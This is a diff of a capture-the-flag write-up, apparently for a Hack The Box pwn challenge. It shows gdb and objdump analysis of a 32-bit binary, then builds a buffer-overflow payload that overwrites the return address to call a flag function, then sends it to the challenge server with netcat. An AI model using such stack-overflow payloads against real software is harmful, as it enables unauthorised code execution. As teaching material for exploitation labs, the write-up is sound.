@@ -17,7 +17,7 @@ This challenge is a little different to the ones we've covered on the track so
 far. We're given a file to download _and_ an IP/port to attack. Downloading the
 file, named `vuln`, it looks like a Linux executable:
 
-```shell
+```shell-session
 $ file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
 ```
@@ -25,28 +25,29 @@ vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically link
 Intriguing... We can use [`objdump`](https://linux.die.net/man/1/objdump) to
 examine the executable's symbols:
 
-<div class="highlight"><pre><code>$ objdump -t vuln
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>objdump -t vuln
 
-vuln:     file format elf32-i386
+<span class="go">vuln:     file format elf32-i386</span>
 
-SYMBOL TABLE:
-...
-00000000       F *UND*    00000000              printf@@GLIBC_2.0
-00000000       F *UND*    00000000              gets@@GLIBC_2.0
-08049391 g     F .text    00000000              .hidden __x86.get_pc_thunk.bp
-08049272 g     F .text    0000003f              <b>vuln</b>
-00000000       F *UND*    00000000              fgets@@GLIBC_2.0
-0804c03c g       .data    00000000              _edata
-08049398 g     F .fini    00000000              .hidden _fini
-...
-0804a000 g     O .rodata  00000004              _fp_hw
-00000000       O *UND*    00000000              stdout@@GLIBC_2.0
-0804c03c g       .bss     00000000              __bss_start
-080492b1 g     F .text    00000076              <b>main</b>
-0804c03c g     O .data    00000000              .hidden __TMC_END__
-00000000       F *UND*    00000000              setresgid@@GLIBC_2.0
-080491e2 g     F .text    00000090              <b>flag</b>
-08049000 g     F .init    00000000              .hidden _init</code></pre></div>
+<span class="go">SYMBOL TABLE:</span>
+<span class="go">...</span>
+<span class="go">00000000       F *UND*    00000000              printf@@GLIBC_2.0</span>
+<span class="go">00000000       F *UND*    00000000              gets@@GLIBC_2.0</span>
+<span class="go">08049391 g     F .text    00000000              .hidden __x86.get_pc_thunk.bp</span>
+<span class="go">08049272 g     F .text    0000003f              <b>vuln</b></span>
+<span class="go">00000000       F *UND*    00000000              fgets@@GLIBC_2.0</span>
+<span class="go">0804c03c g       .data    00000000              _edata</span>
+<span class="go">08049398 g     F .fini    00000000              .hidden _fini</span>
+<span class="go">...</span>
+<span class="go">0804a000 g     O .rodata  00000004              _fp_hw</span>
+<span class="go">00000000       O *UND*    00000000              stdout@@GLIBC_2.0</span>
+<span class="go">0804c03c g       .bss     00000000              __bss_start</span>
+<span class="go">080492b1 g     F .text    00000076              <b>main</b></span>
+<span class="go">0804c03c g     O .data    00000000              .hidden __TMC_END__</span>
+<span class="go">00000000       F *UND*    00000000              setresgid@@GLIBC_2.0</span>
+<span class="go">080491e2 g     F .text    00000090              <b>flag</b></span>
+<span class="go">08049000 g     F .init    00000000              .hidden _init</span>
+</code></pre></div>
 
 Most of this information isn't very interesting, but there are a few symbols to
 note here, which I've highlighted in bold. The first is `main`, the first
@@ -60,7 +61,7 @@ something in some way.
 Let's use `objdump` to look at the assembly of `main` and `vuln`. Within `main`,
 we see the following instructions
 
-```assembly
+```shell-session
 80492fe:      83 c4 10                   add    esp,0x10
 8049301:      83 ec 0c                   sub    esp,0xc
 8049304:      8d 83 38 e0 ff ff          lea    eax,[ebx-0x1fc8]
@@ -82,7 +83,7 @@ should result in a string being printed in the terminal. This is then shortly
 followed by a call to one of the other symbols, `vuln`, at address `8049313`.
 Let's look at the assembly associated with that symbol:
 
-```assembly
+```shell-session
 8049272:      55                         push   ebp
 8049273:      89 e5                      mov    ebp,esp
 8049275:      53                         push   ebx
@@ -249,7 +250,7 @@ we need to exploit.
 
 Let's have a look at how the program behaves using GDB:
 
-```shell
+```shell-session
 $ gdb -q ./vuln
 Reading symbols from ./vuln...
 (No debugging symbols found in ./vuln)
@@ -302,7 +303,7 @@ End of assembler dump.
 `vuln` is called at `main+98`, or `0x08049313`. Let's set a breakpoint there and
 try running the program.
 
-```shell
+```shell-session
 (gdb) break *0x08049313
 Breakpoint 1 at 0x8049313
 (gdb) run
@@ -316,7 +317,7 @@ Breakpoint 1, 0x08049313 in main ()
 Now, let's see what happens to the top of the stack as we follow the call to
 `vuln`:
 
-```shell
+```shell-session
 (gdb) x/wx $esp
 0xffffcde0:    0x00000001
 (gdb) si
@@ -334,7 +335,7 @@ the value we need to overwrite with our buffer overflow.
 Next, let's see how the stack changes as we progress through this function.
 We're currently at the very beginning of the assembly for `vuln`:
 
-```shell
+```shell-session
 (gdb) disass
 Dump of assembler code for function vuln:
 => 0x08049272 <+0>:   push   ebp
@@ -364,39 +365,40 @@ End of assembler dump.
 Let's set a breakpoint at the instruction that calls `gets` and see what the
 stack looks like.
 
-<div class="highlight"><pre><code>(gdb) break *0x08049291
-Breakpoint 2 at 0x8049291
-(gdb) c
-Continuing.
+<div class="highlight"><pre><span></span><code><span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">break *0x08049291</span>
+<span class="go">Breakpoint 2 at 0x8049291</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">c</span>
+<span class="go">Continuing.</span>
 
-Breakpoint 2, 0x08049291 in vuln ()
-(gdb) i r ebp
-ebp            0xffffcdd8          0xffffcdd8
-(gdb) i r esp
-esp            0xffffcd10          0xffffcd10
-(gdb) i r eax
-eax            0xffffcd20          -13024
-(gdb) p $ebp - $esp
-$1 = 200
-(gdb) p/d $ebp - $eax
-$2 = 184
-(gdb) x/60xw $esp
-<b>0xffffcd10</b>:    0xffffcd20    0xf7f9bd67    0x00000001    0x08049281
-<b>0xffffcd20</b>:    0xf7f9bd20    0x000007d4    0x00000001    0xf7dba7cc
-0xffffcd30:    0xf7fca110    0x000007d4    0x0000001c    0x00000001
-0xffffcd40:    0x0000000a    0x0000001c    0xffffcdc8    0xf7e29aef
-0xffffcd50:    0xf7f9bd20    0x0000001c    0xf7f9bd20    0xf7e29f83
-0xffffcd60:    0xf7f9bd20    0xf7f9bd67    0x00000001    0x00000001
-0xffffcd70:    0x00000001    0x00000000    0xf7e2aaed    0xf7f99960
-0xffffcd80:    0xf7f9bd20    0x0000001c    0xffffcdc8    0xf7e1ddeb
-0xffffcd90:    0xf7f9bd20    0x0000000a    0x0000001c    0xf7e7a4b1
-0xffffcda0:    0x00000000    0xf7f9b000    0xf7f9bdbc    0x0000001c
-0xffffcdb0:    0xffffcdf8    0xf7fe7ae4    0x000003e8    0x0804c000
-0xffffcdc0:    0xf7f9b000    0xf7f9b000    0xffffcdf8    0x08049310
-0xffffcdd0:    0x0804a038    0x0804c000    0xffffcdf8    <b>0x08049318</b>
-0xffffcde0:    0x00000001    0xffffcea4    0xffffceac    0x000003e8
-0xffffcdf0:    0xffffce10    0x00000000    0x00000000    0xf7dcaed5
-(gdb)</code></pre></div>
+<span class="go">Breakpoint 2, 0x08049291 in vuln ()</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">i r ebp</span>
+<span class="go">ebp            0xffffcdd8          0xffffcdd8</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">i r esp</span>
+<span class="go">esp            0xffffcd10          0xffffcd10</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">i r eax</span>
+<span class="go">eax            0xffffcd20          -13024</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">p $ebp - $esp</span>
+<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="m">200</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">p/d $ebp - $eax</span>
+<span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="m">184</span>
+<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">x/60xw $esp</span>
+<span class="go"><b>0xffffcd10</b>:    0xffffcd20    0xf7f9bd67    0x00000001    0x08049281</span>
+<span class="go"><b>0xffffcd20</b>:    0xf7f9bd20    0x000007d4    0x00000001    0xf7dba7cc</span>
+<span class="go">0xffffcd30:    0xf7fca110    0x000007d4    0x0000001c    0x00000001</span>
+<span class="go">0xffffcd40:    0x0000000a    0x0000001c    0xffffcdc8    0xf7e29aef</span>
+<span class="go">0xffffcd50:    0xf7f9bd20    0x0000001c    0xf7f9bd20    0xf7e29f83</span>
+<span class="go">0xffffcd60:    0xf7f9bd20    0xf7f9bd67    0x00000001    0x00000001</span>
+<span class="go">0xffffcd70:    0x00000001    0x00000000    0xf7e2aaed    0xf7f99960</span>
+<span class="go">0xffffcd80:    0xf7f9bd20    0x0000001c    0xffffcdc8    0xf7e1ddeb</span>
+<span class="go">0xffffcd90:    0xf7f9bd20    0x0000000a    0x0000001c    0xf7e7a4b1</span>
+<span class="go">0xffffcda0:    0x00000000    0xf7f9b000    0xf7f9bdbc    0x0000001c</span>
+<span class="go">0xffffcdb0:    0xffffcdf8    0xf7fe7ae4    0x000003e8    0x0804c000</span>
+<span class="go">0xffffcdc0:    0xf7f9b000    0xf7f9b000    0xffffcdf8    0x08049310</span>
+<span class="go">0xffffcdd0:    0x0804a038    0x0804c000    0xffffcdf8    <b>0x08049318</b></span>
+<span class="go">0xffffcde0:    0x00000001    0xffffcea4    0xffffceac    0x000003e8</span>
+<span class="go">0xffffcdf0:    0xffffce10    0x00000000    0x00000000    0xf7dcaed5</span>
+<span class="gp gp-VirtualEnv">(gdb)</span>
+</code></pre></div>
 
 Right before `gets` is called, the current stack frame is 200 bytes in size. The
 buffer written to by `gets` starts at `0xffffcd20`, sixteen bytes from the start
@@ -406,7 +408,7 @@ to overwrite this address, we'll need to provide a string that's at least 188
 bytes long (the difference between `0xffffcd20` and `0xffffcddc`). Let's
 continue and see what happens when we do this.
 
-```shell
+```shell-session
 (gdb) ni
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 0x08049296 in vuln ()
@@ -438,7 +440,7 @@ The next challenge is constructing a payload including the address we want the
 CPU to execute in place of the return address. Once again, we can use GDB to get
 this info:
 
-```shell
+```shell-session
 (gdb) p flag
 $6 = {<text variable, no debug info>} 0x80491e2 <flag>
 (gdb)
@@ -458,7 +460,7 @@ with open("payload.bin", "wb") as f:
 
 We can then test this out in GDB by piping the file into the vulnerable process:
 
-```shell
+```shell-session
 (gdb) run < payload.bin
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -493,7 +495,7 @@ Breakpoint 2, 0x08049291 in vuln ()
 
 Looks good so far. Let's set a breakpoint in `flag` and see whether we hit it:
 
-```shell
+```shell-session
 (gdb) break flag
 Breakpoint 3 at 0x80491e6
 (gdb) c
@@ -507,7 +509,7 @@ Breakpoint 3, 0x080491e6 in flag ()
 Great! We've managed to coerce the program into passing control to the `flag`
 function. Let's continue and see what happens...
 
-```shell
+```shell-session
 (gdb) 
 Continuing.
 Hurry up and try in on server side.
@@ -519,7 +521,7 @@ Hurry up and try in on server side.
 Interesting! Looks like `flag` can tell we're running the binary locally. To
 understand what's going on, let's disassemble the `flag` symbol in GDB:
 
-```shell
+```shell-session
 (gdb) disass flag
 Dump of assembler code for function flag:
    0x080491e2 <+0>:    push   ebp
@@ -578,7 +580,7 @@ time. The function calls [`fopen`](https://linux.die.net/man/3/fopen), which
 opens a file and returns a handle to it. Let's put a breakpoint at the call site
 and see what's being provided to `fopen`.
 
-```shell
+```shell-session
 (gdb) break *0x08049205
 Breakpoint 4 at 0x8049205
 (gdb) c
@@ -603,7 +605,7 @@ Shortly after `fopen` is called, the value it returns is checked to see if it is
 null, at which point the function branches. Let's put a dummy `flag.txt` file in
 our local directory and try our exploit again...
 
-```shell
+```shell-session
 $ echo foobarbaz > flag.txt
 $ gdb -q ./vuln
 Reading symbols from ./vuln...
@@ -630,7 +632,7 @@ loaded from `flag.txt` to the console.
 The two `cmp` instructions take the memory addresses `ebp+0x8` and `ebp+0xc` as
 arguments. We can calculate what these addresses are using GDB:
 
-```shell
+```shell-session
 (gdb) break *0x08049246
 Breakpoint 1 at 0x8049246
 (gdb) r
@@ -669,7 +671,7 @@ with open("payload.bin", "wb") as f:
 
 Let's try this payload again...
 
-```shell
+```shell-session
 (gdb) run < payload.bin
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -692,7 +694,7 @@ Nice! Our dummy flag was printed to the console.
 The next step is to feed this payload to the process running on the remote
 machine. We can do this using [netcat](https://en.wikipedia.org/wiki/Netcat):
 
-```shell
+```shell-session
 $ cat payload.bin | nc 138.68.170.205 32570
 You know who are 0xDiablos: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
